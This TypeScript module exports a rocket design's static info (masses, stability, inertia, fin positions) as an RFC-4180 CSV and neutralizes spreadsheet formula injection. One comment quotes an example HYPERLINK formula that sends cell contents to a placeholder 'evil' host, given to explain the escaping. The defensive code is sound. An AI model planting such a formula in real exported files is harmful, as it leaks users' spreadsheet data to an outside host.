import type { StaticInfo } from '../../engine/openRocketEngine';
import type { ReportModel } from './reportModel';
import { exportFilename, saveText } from '../files/saveFile';
import { fmtSi, type UnitSelection } from '../../prefs/units';
import { plainDecimal } from '../files/numberText';
import { staticInfoRows } from './designInfo';
import { type StatKey } from './designInfo';
import { neutralizeFormula } from '../exports/csvCell';
import { CSV_MIME } from '../exports/csvExport';

/**
 * Design-info CSV export — the same Scope / Field / Value / Unit layout
 * OpenRocket writes: a Design block, the whole-Rocket summary, one block per
 * stage, then each fin set's axial position. Field names are kept as stable
 * English data identifiers (not localized); values are in the units the user
 * has chosen, which every row names in its own Unit column. Values use '.' as
 * the decimal separator regardless of locale.
 */

/** Number → clean string with a fixed max decimals and a '.' decimal point. */
const round = (v: number, d: number): string => plainDecimal(v, d);

/**
 * RFC-4180 cell, with spreadsheet formula injection neutralized.
 *
 * Values here are file-sourced: `model.name` is the `<name>` of an imported
 * `.ork` and the fin-set labels are its node names. A rocket named
 * `=HYPERLINK("http://evil/?"&A1,"Open")` would otherwise execute when the
 * exported CSV is opened in Excel or Sheets, so a leading formula trigger gets
 * a `'` in front of it. Same rule as `flightPathExport.ts`.
 *
 * A lone `\r` is quoted too: the file's own terminator is `\r\n`, so an
 * unquoted bare CR inside a name splits the record for RFC-4180 readers.
 */
const cell = (s: string): string => {
  const safe = neutralizeFormula(s);
  return /[",\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
};

/** [field, value, unit] rows for one summary, in the user's units. */
function summaryRows(info: StaticInfo, units: UnitSelection): [string, string, string][] {
  // `fmtSi`, not the locale-aware formatter: this is a data file, and its
  // decimal separator must not move with the UI language.
  const len = (si: number): [string, string] => [fmtSi('length', units.length, si, 3), units.length];
  const mass = (si: number): [string, string] => [fmtSi('mass', units.mass, si, 3), units.mass];
  const cellFor = (key: StatKey, v: number): [string, string] => {
    switch (key) {
      case 'massEmpty':
      case 'massLoaded':
        return mass(v);
      case 'fineness':
        return [round(v, 2), ''];
      case 'stabilityCal':
        return [round(v, 2), 'cal'];
      case 'stabilityPct':
        return [round(v, 1), '%'];
      case 'cd':
        return [round(v, 3), ''];
      case 'cna':
        return [round(v, 2), '/rad'];
      case 'pitchInertia':
      case 'rollInertia':
        return [round(v, 6), 'kg·m²'];
      default:
        return len(v);
    }
  };
  // Which rows exist is staticInfoRows' call, shared with the .ork and the PDF.
  return staticInfoRows(info).map(({ key, field, value }) => [field, ...cellFor(key, value)]);
}

/** The full design-info CSV as a string. */
export function buildDesignCsv(model: ReportModel, units: UnitSelection): string {
  const lines: string[] = ['Scope,Field,Value,Unit'];
  const push = (scope: string, field: string, value: string, unit: string) =>
    lines.push([scope, field, value, unit].map(cell).join(','));

  push('Design', 'Name', model.name, '');
  push('Design', 'Design Type', 'Original Design/Other', '');
  push('Design', 'Stages', String(model.stages.length), '');

  for (const [field, value, unit] of summaryRows(model.whole.info, units)) push('Rocket', field, value, unit);
  for (const st of model.stageSummaries)
    for (const [field, value, unit] of summaryRows(st.info, units)) push(st.label, field, value, unit);

  for (const st of model.finSetsByStage) {
    for (const s of st.sets) {
      const label = st.sets.length > 1 ? `${s.name}: ` : 'Fin set: ';
      push(st.stage, `${label}Nose to top of fin root`, fmtSi('length', units.length, s.topX, 3), units.length);
      push(st.stage, `${label}Nose to bottom of fin root`, fmtSi('length', units.length, s.bottomX, 3), units.length);
    }
  }

  return lines.join('\r\n') + '\r\n';
}

/** Build and download the design-info CSV. */
export function downloadDesignCsv(model: ReportModel, units: UnitSelection): void {
  void saveText(buildDesignCsv(model, units), exportFilename([model.name, 'design'], 'csv'), CSV_MIME);
}
